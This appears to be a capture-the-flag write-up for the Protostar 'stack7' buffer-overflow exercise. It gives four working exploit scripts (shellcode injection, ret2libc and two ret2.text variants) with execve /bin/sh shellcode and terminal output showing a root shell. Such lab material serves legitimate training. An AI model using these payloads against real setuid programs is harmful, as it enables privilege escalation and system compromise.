# stack7

## solution
```py
import struct

off = 80

pad = 'A' * off

buf = ''
buf += '\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9'
buf += '\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89'
buf += '\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80' 

nop = '\x90' * 30

ret = struct.pack('I', 0x08048544)
ret += struct.pack('I', 0xbffff7ad + 0x40)

print pad + ret + nop + buf
```

Here it is in action.
```
user@protostar:/opt/protostar/bin$ ./stack7 < /tmp/pwn
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADAAAAAAAAAAAAD����������������������������������1�1۰̀Sh/ttyh/dev��1�f�'�̀1�Ph//shh/bin��PS�ᙰ

# id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
```

## shells

### ret2libc
```py
import struct

off = 80

pad = 'A' * off

system = struct.pack('I', 0xb7ecffb0)
bin_sh = struct.pack('I', 0xb7e97000 + 0x11f3bf)

ret = struct.pack('I', 0x08048553)
ret += system

print pad + ret + 'AAAA' + bin_sh
```

Here it is in action.
```
user@protostar:/opt/protostar/bin$ (python /tmp/pwn.py; cat) | ./stack7
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAASAAAAAAAAAAAAS���AAAA�c��
id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
```

### ret2.text to shellcode
```py
import struct

off = 80

pad = 'A' * off

buf = ''
buf += '\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9'
buf += '\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89'
buf += '\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'

nop = '\x90' * 0x40

ret = struct.pack('I', 0x080485c7)

ret += 'AAAA'                              # POP
ret += 'AAAA'                              # POP
ret += struct.pack('I', 0xbffff7ac + 0x40) # RET

print pad + ret + nop + buf
```

Here it is in action.
```
user@protostar:/opt/protostar/bin$ python /tmp/pwn.py | ./stack7
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��������������������������������������������������������������������1�1۰̀Sh/ttyh/dev��1�f�'�̀1�Ph//shh/bin��PS�ᙰ

# id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
```

### ret2.text to libc
```py
import struct

off = 80

pad = 'A' * off

system = struct.pack('I', 0xb7ecffb0)
bin_sh = struct.pack('I', 0xb7e97000 + 0x11f3bf)

ret = struct.pack('I', 0x08048492)

ret += 'AAAA' # POP
ret += 'AAAA' # POP
ret += system # RET

print pad + ret + 'AAAA' + bin_sh
```

Here it is in action.
```
user@protostar:/opt/protostar/bin$ (python /tmp/pwn.py; cat) | ./stack7
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�AAAAAAAAAAAA�AAAAAAAA���AAAA�c��
id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
```
